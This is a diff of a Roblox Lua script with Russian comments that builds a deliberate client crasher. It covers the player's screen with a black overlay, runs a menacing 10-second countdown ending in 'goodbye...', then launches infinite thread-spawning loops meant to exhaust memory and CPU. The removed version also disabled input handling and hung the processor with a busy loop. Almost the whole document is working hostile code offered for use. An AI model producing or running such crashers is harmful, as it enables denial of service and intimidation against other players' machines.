@@ -1,24 +1,55 @@
--- Максимально жесткий краш клиента
-local function heavyCrash()
-    -- Отключаем обработку ввода, чтобы игрок не мог даже нажать Esc
-    game:GetService("UserInputService").MouseIconEnabled = false
-    
-    -- Бесконечный цикл создания "мусора" в памяти
+local Player = game.Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+-- 1. Создаем интерфейс
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = PlayerGui
+ScreenGui.IgnoreGuiInset = true -- Чтобы закрыть даже верхнюю панель
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Черный фон
+Frame.Parent = ScreenGui
+
+local TimerLabel = Instance.new("TextLabel")
+TimerLabel.Size = UDim2.new(1, 0, 0.5, 0)
+TimerLabel.Position = UDim2.new(0, 0, 0.2, 0)
+TimerLabel.BackgroundTransparency = 1
+TimerLabel.TextColor3 = Color3.new(1, 0, 0) -- Красный текст
+TimerLabel.TextScaled = true
+TimerLabel.Font = Enum.Font.SpecialElite -- Жуткий шрифт
+TimerLabel.Parent = Frame
+
+local SubLabel = Instance.new("TextLabel")
+SubLabel.Size = UDim2.new(1, 0, 0.2, 0)
+SubLabel.Position = UDim2.new(0, 0, 0.6, 0)
+SubLabel.BackgroundTransparency = 1
+SubLabel.TextColor3 = Color3.new(1, 1, 1) -- Белый текст
+SubLabel.Text = "-У ТЕБЯ ЕЩЕ ЕСТЬ ВРЕМЯ!!!"
+SubLabel.TextScaled = true
+SubLabel.Font = Enum.Font.SourceSansBold
+SubLabel.Parent = Frame
+
+-- 2. Логика таймера
+for i = 10, 1, -1 do
+    TimerLabel.Text = tostring(i)
+    task.wait(1)
+end
+
+TimerLabel.Text = "0"
+SubLabel.Text = "ПРОЩАЙ..."
+task.wait(0.5)
+
+-- 3. Функция краша (Memory Leak + CPU Overload)
+local function crash()
     while true do
         task.spawn(function()
-            -- Создаем тяжелые объекты, которые дублируются в геометрической прогрессии
-            for i = 1, 1000 do
-                local s = Instance.new("ScreenGui", game.CoreGui)
-                local f = Instance.new("Frame", s)
-                f.Size = UDim2.new(1, 0, 1, 0)
-                -- Добавляем эффекты, которые нагружают видеокарту
+            while true do
+                Instance.new("Message", workspace).Text = "CRASHING..."
                 Instance.new("BlurEffect", game.Lighting).Size = 100
             end
         end)
-        -- Этот пустой цикл без ожидания намертво вешает поток процессора
-        while true do end 
     end
 end
 
-heavyCrash()
-
+crash()
